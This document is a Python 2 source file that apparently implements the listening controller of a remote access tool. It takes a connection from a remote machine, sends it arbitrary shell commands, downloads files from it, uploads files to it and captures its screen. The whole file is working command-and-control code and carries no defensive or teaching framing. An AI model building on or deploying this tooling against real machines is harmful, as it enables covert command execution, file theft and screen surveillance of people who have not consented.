import sys
import socket
import base64
import os

RECV_BYTE = 1024    


def b64e(x):
    return base64.b64encode(x)


def normalize_path_args(args):
    single_quote_token = b64e('SGQT')
    double_quote_token = b64e('DBQT')
    space_token = b64e('SPCT')
    backslash_token = b64e('BKST')
    args = args.replace('\\\'', single_quote_token)
    args = args.replace('\\"', double_quote_token)
    args = args.replace('\\ ', space_token)
    args = args.replace('\\\\', backslash_token)

    args = args.replace('\'', '"')

    index = 0
    arg_list = []
    prev_quote_ret2 = 0
    while index < len(args):
        quote_ret = args.find('"', index)
        space_ret = args.find(' ', index)
        if quote_ret == -1 and space_ret == -1:
            break
        elif quote_ret != -1 and (space_ret == -1 or space_ret != -1 and quote_ret < space_ret):
            quote_ret2 = args.find('"', quote_ret+1)
            if quote_ret2 == -1:
                print "[!] Error: Quote matching failed in normalize_path_args()."
                return []

            arg = args[quote_ret+1: quote_ret2]
            arg = arg.replace (' ', space_token)

            # concat string
            if quote_ret == prev_quote_ret2 + 1:
                arg_list[-1] = arg_list[-1] + arg
            else:
                arg_list.append(arg)

            index = quote_ret2 + 1
            prev_quote_ret2 = quote_ret2
        else:
            arg_list.append(args[index:space_ret])

            index = space_ret+1

    arg_list.extend(args[index:].split(' '))
    if '' in arg_list:
        arg_list = [ x for x in arg_list if x != '']

    for i in range(0, len(arg_list)):
        arg_list[i] = arg_list[i].replace(single_quote_token, '\\\'')
        arg_list[i] = arg_list[i].replace(double_quote_token, '\\"')
        arg_list[i] = arg_list[i].replace(space_token, '\\ ')
        arg_list[i] = arg_list[i].replace(backslash_token, '\\\\')

    return arg_list


def download_file(conn, args):
    arg_list = normalize_path_args(args)
    arg_num = len(arg_list)
    if arg_num == 0 or arg_num > 2:
        print '[!] Usage: download <src_file_path> [<dst_file_path>]'
        return
    else:
        src_file_path = arg_list[0]
        if arg_num == 2:
            dst_file_path = arg_list[1]
        else:
            dst_file_path = './'

    if os.path.isdir(dst_file_path):
        dst_file_path = dst_file_path + src_file_path.replace('\\', '/').split('/')[-1]  # file name

    if os.path.isdir(dst_file_path):
        print '[!] Directory:', dst_file_path, ' already exist, please specify another file name.'
        return
    """
    if os.path.isfile(dst_file_path):
        print '[!] File:', dst_file_path, ' already exist, please specify another file name.'
        return
    """
    conn.send('download ' + src_file_path)

    packet = conn.recv(RECV_BYTE)
    if b64e('REMOTE_FILE_NOT_EXIST') in packet:
        print '[!] Remote: ', src_file_path, ' does not exist.'
    elif b64e('REMOTE_FILE_IS_A_DIRECTORY') in packet:
        print '[!] Remote: ', src_file_path, ' is a directory.'
    else:
        transfer_done_token = b64e('REMOTE_FILE_DOWNLOAD_DONE')
        f = open(dst_file_path, 'wb')
        if not packet.endswith(transfer_done_token):
            f.write(packet)
            while True:
                packet = conn.recv(RECV_BYTE)
                print packet
                if packet.endswith(transfer_done_token):
                    break
                f.write(packet)

        # final data
        f.write(packet.split(transfer_done_token, 1)[0])
        f.close()

    print '[*] Download completed.'


def upload_file(conn, args):
    arg_list = normalize_path_args(args)
    arg_num = len(arg_list)
    if arg_num == 0 or arg_num > 2:
        print '[!] Usage: upload <src_file_path> [<dst_file_path>]'
        return
    else:
        src_file_path = arg_list[0]
        if arg_num == 2:
            dst_file_path = arg_list[1]
        else:
            dst_file_path = './'+src_file_path.replace('\\', '/').split('/')[-1]

    if not os.path.exists(src_file_path):
        print '[!] ', src_file_path, ' does not exist.'
        return

    if not os.path.isfile(src_file_path):
        print '[!] ', src_file_path, ' is not a file.'
        return

    conn.send('upload ' + dst_file_path)

    packet = conn.recv(RECV_BYTE)
    if b64e('REMOTE_FILE_ALREADY_EXISTS') in packet:
        print '[!] Remote: ', dst_file_path, 'already exists.'
    elif b64e('REMOTE_FILE_UPLOAD_START') in packet:
        f = open(src_file_path, 'rb')
        while True:
            packet = f.read(RECV_BYTE)
            if packet == '':
                break
            conn.send(packet)
        conn.send(b64e('LOCAL_FILE_UPLOAD_DONE'))
        f.close()

    print '[*] Upload completed.'


def screen_capture(conn, args):
    arg_list = normalize_path_args(args)
    arg_num = len(arg_list)
    dst_file_path = './cap.jpg'
    if arg_num > 1:
        print '[!] Usage: screncap [<dst_file_path>]'
        return
    elif arg_num == 1:
        dst_file_path = arg_list[0]

    if os.path.isdir(dst_file_path):
        dst_file_path += '/cap.jpg'

    conn.send('screencap')

    packet = conn.recv(RECV_BYTE)
    if b64e('REMOTE_FILE_NOT_EXIST') in packet:
        print '[!] Remote: screencap image does not exist.'
    elif b64e('REMOTE_FILE_IS_A_DIRECTORY') in packet:
        print '[!] Remote: screencap image is a directory.'
    else:
        transfer_done_token = b64e('REMOTE_FILE_DOWNLOAD_DONE')
        f = open(dst_file_path, 'wb')
        if not packet.endswith(transfer_done_token):
            f.write(packet)
            while True:
                packet = conn.recv(RECV_BYTE)
                if packet.endswith(transfer_done_token):
                    break
                f.write(packet)

        # final data
        f.write(packet.split(transfer_done_token, 1)[0])
        f.close()


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind ((sys.argv[0], int(sys.argv[1])))
    s.listen(1)
    print '[*] Waiting for connection...'
    conn, addr = s.accept()
    print '[+] Accept connection from ', addr

    while True:
        command = raw_input('#> ')

        command_split = command.split(' ', 1)
        action = command_split[0].lower()
        if len(command_split) == 2:
            args = command_split[1]
        else:
            args = ''

        if 'exit' == action or 'quit' == action:
            conn.send('exit')
            conn.close()
            break
        elif 'download' == action:
            download_file(conn, args)
        elif 'upload' == action:
            upload_file(conn, args)
        elif 'screencap' == action:
            screen_capture(conn, args)
        else:
            conn.send(command)
            print conn.recv(RECV_BYTE)


def main():
    if len(sys.argv) < 3:
        print '[!] Usage: Basic_Server.py <host> <port>'
        return

    sys.argv = sys.argv[1:]
    connect()


main()
